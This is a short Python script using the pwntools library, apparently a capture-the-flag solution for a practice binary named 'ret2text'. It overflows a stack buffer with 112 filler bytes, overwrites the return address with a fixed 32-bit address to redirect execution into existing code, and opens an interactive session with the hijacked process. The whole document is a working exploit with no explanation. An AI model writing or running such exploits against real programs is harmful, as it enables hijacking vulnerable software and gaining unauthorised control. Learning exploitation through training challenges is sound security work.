from pwn import *


proc = process("./ret2text")
target_addr = 0x804863A
proc.sendline(b"#" * 112 + p32(target_addr))
proc.interactive()
